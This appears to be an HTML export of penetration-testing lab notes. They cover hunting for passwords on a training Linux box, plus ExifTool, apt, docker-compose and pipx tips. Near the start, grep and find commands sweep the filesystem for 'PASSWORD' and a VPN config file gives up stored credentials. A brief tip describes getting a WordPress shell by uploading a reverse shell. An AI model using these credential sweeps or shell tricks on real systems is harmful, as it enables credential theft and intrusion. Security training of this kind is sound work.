href="https://www.google.com/url?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2520and%2520Resources/Linux%2520-%2520Privilege%2520Escalation.md%23looting-for-passwords&amp;sa=D&amp;source=editors&amp;ust=1699590511542366&amp;usg=AOvVaw3rXCI3GCGFuQQ6Z8uEGVMN">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#looting-for-passwords</a></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 534.00px;"><img alt="" src="images/image186.png" style="width: 624.00px; height: 534.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ol class="c8 lst-kix_list_157-0" start="4"><li class="c0 c5 li-bullet-0"><span class="c9">This is where we got our earlier script for our colored grep search, but we can see there is a second command, a &ldquo;find&rdquo; command which runs a search for the directory that you are in:</span></li></ol><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 591.00px; height: 169.00px;"><img alt="" src="images/image215.jpg" style="width: 591.00px; height: 169.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_158-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">grep --color=auto -rnw &#39;/&#39; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null</span></li><li class="c0 c5 li-bullet-0"><span class="c9">find . -type f -exec grep -i -I &quot;PASSWORD&quot; {} /dev/null \;</span></li></ul><p class="c3 c5"><span class="c2"></span></p><ol class="c8 lst-kix_list_157-0" start="5"><li class="c0 c5 li-bullet-0"><span class="c9">Let&rsquo;s run that second &ldquo;find&rdquo; command which will search our current directory for the term &ldquo;password&rdquo;::</span></li></ol><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ find . -type f -exec grep -i -I &quot;PASSWORD&quot; {} /dev/null \;</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 226.00px;"><img alt="" src="images/image210.png" style="width: 624.00px; height: 226.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c9">-Toward the very bottom of its run, we can see that same username and password we found earlier, but we can also see another password, sitting inside of a hidden config file in our current directory, which was the initial login to the box before the author changed it:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 93.00px;"><img alt="" src="images/image208.jpg" style="width: 624.00px; height: 93.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c9">-Alright, so sometimes we need to look around at what&rsquo;s in front of us, right before our eyes. We don&rsquo;t always have to hunt and dig to find things, often we do, but once in a while, there&rsquo;s a shiny coin staring right at us. &nbsp;Let&rsquo;s go back to our Home folder. You can do that by just typing &ldquo;cd ~&rdquo;:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">TCM@debian:~/tools$ cd ~</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 252.00px; height: 84.00px;"><img alt="" src="images/image214.jpg" style="width: 252.00px; height: 84.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9">-Notice that we have this file called, &ldquo;myvpn.ovpn&rdquo;. Let&rsquo;s &ldquo;cat&rdquo; that out:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ cat myvpn.ovpn</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 305.00px; height: 294.00px;"><img alt="" src="images/image212.png" style="width: 305.00px; height: 294.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9">-We can see there&rsquo;s an &ldquo;auth-user-pass&quot;:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 299.00px; height: 54.00px;"><img alt="" src="images/image202.png" style="width: 299.00px; height: 54.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9">-If we &ldquo;cat&rdquo; that out, we can see that we have credentials left behind in memory. That user doesn&rsquo;t exist anymore, but the creds are still there:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 446.00px; height: 102.00px;"><img alt="" src="images/image200.png" style="width: 446.00px; height: 102.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_159-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">EXIF Data:</span></li></ul><ul class="c8 lst-kix_list_160-0 start"><li class="c0 c5 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://exiftool.org/&amp;sa=D&amp;source=editors&amp;ust=1699590511545689&amp;usg=AOvVaw1FDWQBvFjGRNiWeJcU9tt2">https://exiftool.org</a></span></li><li class="c0 c5 li-bullet-0"><span class="c13"><a class="c6" href="https://www.google.com/url?q=https://exifmeta.com/&amp;sa=D&amp;source=editors&amp;ust=1699590511546171&amp;usg=AOvVaw1Agudo9WF_fRUIaeoiNBek">https://exifmeta.com</a></span></li></ul><p class="c4 c5"><span class="c9">-I like ExifTool by Phil Harvey: </span><span class="c26"><a class="c6" href="https://www.google.com/url?q=https://exiftool.org./&amp;sa=D&amp;source=editors&amp;ust=1699590511546536&amp;usg=AOvVaw3AgB87-9b6eojzEGyYFIBa">https://exiftool.org.</a></span><span class="c9">&nbsp; It&rsquo;s simple to use, but if you are on Windows, don&rsquo;t forget to change the name of the EXE if you are going to use the syntax listed on Phil&rsquo;s page, for example:</span></p><p class="c3 c5"><span class="c9"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 527.00px; height: 43.60px;"><img alt="" src="images/image206.jpg" style="width: 527.00px; height: 43.60px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c9"></span></p><p class="c4 c5"><span class="c9">...but the exe will actually be named &ldquo;exiftool(-k).exe&rdquo; by default when you unzip it, so if you were to run that, you would need the following syntax:</span></p><p class="c3 c5"><span class="c9"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 545.00px; height: 42.27px;"><img alt="" src="images/image204.jpg" style="width: 545.00px; height: 42.27px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c9"></span></p><p class="c4 c5"><span class="c9">-For Linux, see below:</span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_159-0"><li class="c0 c5 li-bullet-0"><span class="c9">Missing Tools/Packages:</span></li></ul><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9">-If your Linux Distro doesn&rsquo;t have a tool installed that you want to use, you can perform the following actions to find it, and install it:</span></p><p class="c3 c5"><span class="c9"></span></p><ol class="c8 lst-kix_list_161-0 start" start="1"><li class="c0 c5 li-bullet-0"><span class="c9">Using EXIFTOOL as an example, run the following command to see what package the tool comes from:</span></li></ol><p class="c3 c5"><span class="c9"></span></p><p class="c4 c5"><span class="c2">&#9492;&#9472;# dpkg -S exiftool</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 705.00px; height: 104.27px;"><img alt="" src="images/image198.jpg" style="width: 705.00px; height: 104.27px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ol class="c8 lst-kix_list_161-0" start="2"><li class="c0 c5 li-bullet-0"><span class="c9">Next, copy-pasta the tool library name:</span></li></ol><p class="c3 c5"><span class="c9"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 684.27px; height: 412.00px;"><img alt="" src="images/image169.png" style="width: 684.27px; height: 412.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ol class="c8 lst-kix_list_161-0" start="3"><li class="c0 c5 li-bullet-0"><span class="c9">Now, type &ldquo;sudo apt install&rdquo; (without quotes) and then paste the library name you copied:</span></li></ol><p class="c3 c5"><span class="c9"></span></p><p class="c4 c5"><span class="c2">&#9492;&#9472;# sudo apt install libimage-exiftool-perl</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 461.00px; height: 46.60px;"><img alt="" src="images/image168.jpg" style="width: 461.00px; height: 46.60px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 710.00px; height: 273.67px;"><img alt="" src="images/image162.png" style="width: 710.00px; height: 273.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ol class="c8 lst-kix_list_161-0" start="4"><li class="c0 c5 li-bullet-0"><span class="c9">&nbsp;After an install with minor errors, it can help to run an update:</span></li></ol><p class="c3 c5"><span class="c9"></span></p><p class="c4 c5"><span class="c9">&#9492;&#9472;# sudo apt update</span></p><p class="c3 c5"><span class="c9"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 413.00px; height: 51.47px;"><img alt="" src="images/image160.jpg" style="width: 413.00px; height: 51.47px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ol class="c8 lst-kix_list_161-0" start="5"><li class="c0 c5 li-bullet-0"><span class="c9">After the update, you can then try re-installing the package with &ldquo;--fix-missing&quot;:</span></li></ol><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">&#9492;&#9472;# sudo apt install libimage-exiftool-perl --fix-missing</span></p><p class="c3 c5"><span class="c9"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 591.00px; height: 57.87px;"><img alt="" src="images/image166.jpg" style="width: 591.00px; height: 57.87px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_162-0 start"><li class="c0 c5 li-bullet-0"><span class="c19">Docker:</span></li></ul><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_163-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">To see the apps that we have running with Docker Compose, simply type in: docker-compose ps</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 708.60px; height: 248.00px;"><img alt="" src="images/image164.png" style="width: 708.60px; height: 248.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_164-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">To stop what&rsquo;s running, we can type: docker-compose stop:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 419.00px; height: 63.53px;"><img alt="" src="images/image156.png" style="width: 419.00px; height: 63.53px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_162-0"><li class="c0 c5 li-bullet-0"><span class="c19">WordPress:</span></li></ul><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_163-0"><li class="c0 c5 li-bullet-0"><span class="c1">Tip: With WordPress, a routine way to get a shell is to go to the Theme Editor to customize a theme, then upload a reverse shell, but that only works with write privileges.</span></li></ul><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_165-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Pipx - pip install via Kali on the Way Out:</span></li></ul><ul class="c8 lst-kix_list_166-0 start"><li class="c0 c5 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.kali.org/blog/python-externally-managed&amp;sa=D&amp;source=editors&amp;ust=1699590511549998&amp;usg=AOvVaw1ueyf5icL3wdNdeLZUtryv">https://www.kali.org/blog/python-externally-managed</a></span></li><li class="c0 c5 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://pypa.github.io/pipx&amp;sa=D&amp;source=editors&amp;ust=1699590511550410&amp;usg=AOvVaw37tMoPn9bS0DEDGu_SPawI">https://pypa.github.io/pipx</a></span></li></ul><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_167-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Thursday, 06 July 2023</span></li></ul><p class="c4 c5"><span class="c2">Pip install and Python&#39;s externally managed</span></p><p class="c4 c5"><span class="c2">TL;DR: pip install is on the way out. Installing Python packages must be done via APT, aka. Kali Linux&rsquo;s package manager. Python packages coming from other sources should be installed in virtual environments.</span></p><p class="c3 c5"><span class="c1"></span></li></ul>






</ul>
  </ul>
</details>





</body>
</html>

